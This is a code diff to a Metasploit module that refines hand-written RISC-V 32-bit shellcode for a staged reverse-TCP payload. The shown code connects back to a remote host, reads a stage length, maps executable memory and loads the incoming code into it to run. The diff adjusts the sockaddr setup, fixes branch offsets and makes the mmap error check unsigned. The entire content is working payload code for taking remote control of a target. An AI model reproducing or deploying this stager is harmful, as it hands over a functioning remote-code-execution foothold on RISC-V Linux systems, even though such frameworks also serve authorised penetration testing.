@@ -63,11 +63,10 @@ module MetasploitModule
       0x00612023,          # sw    t1, 0(sp)         # store family+port
       0x0042a303,          # lw    t1, 4(t0)         # load sockaddr[4:7]
       0x00612223,          # sw    t1, 4(sp)         # store sin_addr
-      0x00012423,          # sw    zero, 8(sp)       # sin_zero[0:3]
-      0x00012623,          # sw    zero, 12(sp)      # sin_zero[4:7]
+      0x00012423,          # sw    zero, 8(sp)       # sin_zero[0:3] (Linux ignores sin_zero for TCP)
       0x00010593,          # mv    a1, sp            # a1 = &sockaddr on stack
       0x00000073,          # ecall
-      0x08051263,          # bnez  a0, fail
+      0x08051463,          # bnez  a0, fail
 
       # read(s1, sp, 4) — read stage length
       0x00048513,          # mv    a0, s1            # fd
@@ -78,7 +77,7 @@ module MetasploitModule
 
       # validate read returned exactly 4 bytes
       0x00400313,          # li    t1, 4
-      0x06651463,          # bne   a0, t1, fail
+      0x06651663,          # bne   a0, t1, fail
 
       # mmap(NULL, aligned_length, PROT_RWX, MAP_PRIVATE|MAP_ANON, -1, 0)
       0x00012e03,          # lw    t3, 0(sp)         # t3 = stage length
@@ -93,8 +92,11 @@ module MetasploitModule
       0x0de00893,          # li    a7, 222           # SYS_mmap
       0x00000073,          # ecall
 
-      # validate mmap succeeded
-      0x02054c63,          # bltz  a0, fail
+      # validate mmap succeeded — unsigned check required because user-space addresses
+      # on riscv32le may have bit 31 set (above 0x80000000); bltz would misfire on them.
+      # Linux mmap errors are always in [0xFFFFF001, 0xFFFFFFFF]; valid addresses are not.
+      0xFFFFF337,          # lui   t1, 0xFFFFF        # t1 = 0xFFFFF000
+      0x02A36C63,          # bltu  t1, a0, fail       # branch if a0 > 0xFFFFF000 (error range)
 
       0x000e0e93,          # mv    t4, t3            # t4 = remaining bytes
       0x00050f13,          # mv    t5, a0            # t5 = mmap base (exec target)
